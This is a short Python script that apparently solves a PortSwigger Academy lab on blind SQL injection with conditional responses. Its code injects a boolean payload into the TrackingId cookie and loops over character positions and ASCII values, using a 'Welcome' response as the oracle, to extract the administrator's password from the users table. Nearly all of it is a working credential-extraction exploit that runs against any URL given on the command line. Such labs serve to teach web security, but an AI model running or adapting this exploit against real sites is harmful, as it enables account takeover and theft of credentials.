#!/usr/bin/python3

import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Blind SQL injection with conditional responses')
        print('    >> by Port Swigger Academy\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}

def sqli_password(url):
    password_extracted = ""
    for i in range (1,21):
        for j in range (32,126):
            sqli_payload = "' and  (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId':'Yc2Mgvt0ZHt3qanJ' + sqli_payload_encoded, 'session': 'Oudtoei7P10N2bwSOhiu9QxYaNfcenYr'}
            r = requests.get(url, cookies=cookies, verify=False,proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r'+ password_extracted)
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) !=2:
        output.info("Usage: %s <url>" % sys.argv[0])
        output.info("Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    output.info("Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
